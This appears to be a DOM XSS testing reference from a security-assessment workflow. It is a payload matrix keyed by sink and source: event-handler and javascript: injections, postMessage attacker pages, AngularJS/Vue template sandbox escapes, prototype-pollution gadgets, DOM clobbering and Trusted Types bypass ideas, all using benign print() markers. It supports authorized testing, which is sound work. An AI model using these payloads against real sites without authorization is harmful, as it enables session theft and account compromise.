# DOM XSS payloads by sink + delivery (steps 4–5)
# Classify the SINK (from taint_flows.json), pick a payload, deliver it via the SOURCE.
# Record attempts in payloads_tried.jsonl: {id, source, sink, delivery, payload, reached, executed}.
# Benign confirmation only (print()/window.__rs). Hash delivery sends nothing to the server.

## Delivery vectors (by source)
```
hash:        https://target/page#PAYLOAD
search:      https://target/page?q=PAYLOAD           # client-read param (not server-reflected)
window.name: attacker page sets window.name=PAYLOAD then navigates to target
referrer:    victim arrives at target FROM attacker page carrying PAYLOAD in the URL
postMessage: attacker page -> target iframe:  frame.postMessage(PAYLOAD, '*')
```

## Payload by sink type
### HTML sinks (`innerHTML`, `document.write`, `$().html`, `insertAdjacentHTML`)
```
<img src=x onerror=print()>
<svg onload=print()>
```
Note: `<script>` injected via `innerHTML` does NOT execute — use `img`/`svg`/event handlers.

### Code-exec sinks (`eval`, `Function`, `setTimeout(string)`)
```
print()
;window.__rs=1//
```

### Navigation sinks (`location`, `a.href`, `location.href=`)
```
javascript:print()
javascript:print()//
```

### jQuery `$(source)`
```
#<img src=x onerror=print()>          # $(location.hash) on older jQuery
```

### postMessage handler → sink
```
# attacker page:
target.contentWindow.postMessage('<img src=x onerror=print()>', '*')
```

## Prototype pollution → gadget
```
https://target/page?__proto__[src]=data:,print()           # then a gadget uses polluted .src
https://target/page?__proto__[innerHTML]=<img src=x onerror=print()>
```
Confirm the pollution (`Object.prototype.src` set) AND the gadget firing — report the chain.

## Trusted Types / CSP
If `require-trusted-types-for 'script'` is set, string→sink is blocked. Look for an existing
**default policy** or an allowed policy that passes your input, or a DOMPurify-as-TT config with a
bypass. If none, the flow is non-executing under TT → downgrade (verify.md).

Escalate complexity only when a simple vector is proven filtered. Confirm EXECUTION via the browser
(devtools trace), not mere reflection into the DOM.

---

## Extended arsenal — source→sink payload matrix
Benign markers only (`print()` / `window.__rs=1`). Deliver via the SOURCE; the payload fires at the SINK.
### HTML-write sinks (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `$.html/append/…`, `Range.createContextualFragment`, `DOMParser.parseFromString(_,'text/html')`)
```
<img src=x onerror=print()>
<svg onload=print()>
<svg><animate onbegin=print() attributeName=x dur=1s>
<iframe srcdoc="<svg onload=print()>">
# raw <script> set via innerHTML does NOT run — use img/svg/handlers
# delivery:
#<img src=x onerror=print()>            # location.hash → el.innerHTML
?q=<img src=x onerror=print()>          # client-read param → innerHTML
```
### Code-exec sinks (`eval`, `Function`, `setTimeout/Interval('…')`, `setAttribute('on*',…)`, `execScript`)
```
print()
;print()//
})(print())//                           # close a wrapper the sink builds
print();var _=(                          # for eval('f('+src+')')
```
### Navigation / scheme sinks (`location`, `location.href/assign/replace`, `a.href`, `iframe.src`, `window.open`, `form.action`)
```
javascript:print()
javascript:void(print())//
#javascript:print()                      # when code does: location = location.hash.slice(1)
```
### Attribute sinks (`setAttribute`, `el.src/href/srcdoc/formaction`, `el.style`)
```
setAttribute('href','javascript:print()')
iframe.srcdoc = '<svg onload=print()>'
```
### jQuery-specific (version-sensitive — confirm via retire.js)
```
$(location.hash)                         # #<img src=x onerror=print()>  (selector→HTML, esp. <3.5)
$('#'+location.hash.slice(1))
$.parseHTML(userInput)                   # <img src=x onerror=print()>
$('<div>').html(userInput)
$(userInput).appendTo('body')
```
`<1.9` ran scripts from `.html()`; `1.12`/`2.x`/`<3.5` have selector→HTML quirks.

## Extended arsenal — postMessage exploitation (source: `event.data`)
Attacker page drives a handler that trusts `event.data` and skips/mis-checks `event.origin`:
```html
<iframe src="https://HOST/page" id=f></iframe>
<script>
f.onload = () => f.contentWindow.postMessage('<img src=x onerror=print()>', '*');
// structured variant:
f.onload = () => f.contentWindow.postMessage({html:'<img src=x onerror=print()>'}, '*');
</script>
```
Weak origin checks that still fire (attacker at `HOST.evil.com` / `attacker-HOST.com`):
```
origin.indexOf('HOST') > -1
origin.startsWith('https://HOST')
/HOST/.test(origin)                      # unanchored regex
```
Benign proof: the target runs `print()` / sets `window.__rs=1` from the posted value.

## Extended arsenal — client-side template injection (DOM-evaluated)
Confirm `{{7*7}}`→`49` first.
### AngularJS (expression sandbox by version; sandbox removed in 1.6)
```
{{constructor.constructor('print()')()}}                     # 1.0.x / 1.6+
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'print()')()}}   # 1.2.19–1.2.23
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,print(),a')}}    # 1.3.0
{{'a'.constructor.prototype.charAt=[].join;$eval('x=print()')}}               # 1.4.0–1.5.8
```
Delivered via a source bound into the template (hash/search). Pin the exact minor version first.
### Vue
```
{{constructor.constructor('print()')()}}     # Vue 2
{{_c.constructor('print()')()}}              # Vue 2
{{_openBlock.constructor('print()')()}}      # Vue 3
# v-html="src" with tainted src → <img src=x onerror=print()>
```

## Extended arsenal — prototype-pollution → DOM-XSS gadget chains
Pollute a property a later sink reads off a plain object (confirm on a FRESH object, then the gadget firing):
```
?__proto__[src]=data:,print()                       # gadget: cfg.src || default → script.src
?__proto__[innerHTML]=<img src=x onerror=print()>   # gadget: el.innerHTML = cfg.innerHTML
?__proto__[onerror]=print()                         # gadget sets el.onerror from cfg
#__proto__[src]=data:,print()                        # via a hash sink
{"__proto__":{"template":"<img src=x onerror=print()>"}}   # JSON merge → template gadget
constructor[prototype][src]=data:,print()            # when __proto__ is filtered
```
Common sink-bearing merges: `$.extend(true,…)`, lodash `merge/set/defaultsDeep`, config/sanitizer loaders.
Report the full chain: pollution proof + gadget execution.

## Extended arsenal — DOM clobbering (markup-only → variable control)
When only tags/attributes pass, clobber a named reference a script reads:
```html
<a id=x href="javascript:print()"></a>              # code: location = window.x / x.href
<form id=cfg><input name=url value="javascript:print()"></form>   # cfg.url
<img name=currentScript>                             # clobber document.currentScript reads
<a id=y></a><a id=y name=z href=...>                 # y.z nested (HTMLCollection) clobber
```
Benign proof: clobber a value the page feeds to `location`/`.src`/`innerHTML`, aim it at `print()` or a
`TOKEN.oob.example` marker.

## Extended arsenal — Trusted Types bypass patterns
If `require-trusted-types-for 'script'` is enforced, string→sink throws. Look for:
```
# an existing default policy whose createHTML returns input verbatim → inject normally
# a named policy with a weak createHTML/createScriptURL reachable with your input
# DOMPurify-as-a-TT-policy with a bypassable config (allow svg/mathml, ALLOW_UNKNOWN_PROTOCOLS, …)
# navigation/scheme sinks NOT covered by TT → javascript: still works
# a 'trusted-types *' or report-only policy → not enforced; treat as no-TT
```
If none and TT is enforced: flow is non-executing under TT → downgrade (verify.md), note the missing control.

## Extended arsenal — additional sources & delivery
```
history.state / pushState data → sink
localStorage/sessionStorage set by an earlier flow → sink (chain)
document.cookie read into a sink (needs a cookie-set vector)
WebSocket / EventSource / BroadcastChannel message → innerHTML
document.referrer → sink (link from an attacker page carrying the payload in its URL)
window.name → sink (set on the attacker page, then navigate to HOST)
```
